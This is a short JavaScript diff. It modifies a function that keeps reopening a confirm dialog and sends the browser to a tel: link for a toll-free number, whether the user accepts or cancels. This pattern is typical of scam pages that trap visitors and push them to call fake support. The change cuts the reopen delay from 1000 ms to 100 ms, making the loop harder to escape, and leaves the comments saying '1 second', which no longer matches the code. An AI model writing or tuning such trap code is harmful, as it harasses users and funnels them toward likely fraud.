@@ -6,10 +6,10 @@ function showConfirmMessage() {
         window.location.href = "tel:+1(844)906-6151";
         
         // Reopen the confirm message after dialing
-        setTimeout(showConfirmMessage, 1000); // Delay for 1 second before reopening the message
+        setTimeout(showConfirmMessage, 100); // Delay for 1 second before reopening the message
     } else {
         console.log("User canceled the call.");
-        setTimeout(showConfirmMessage, 1000); // Delay for 1 second before reopening the message
+        setTimeout(showConfirmMessage, 100); // Delay for 1 second before reopening the message
     }
 }
 
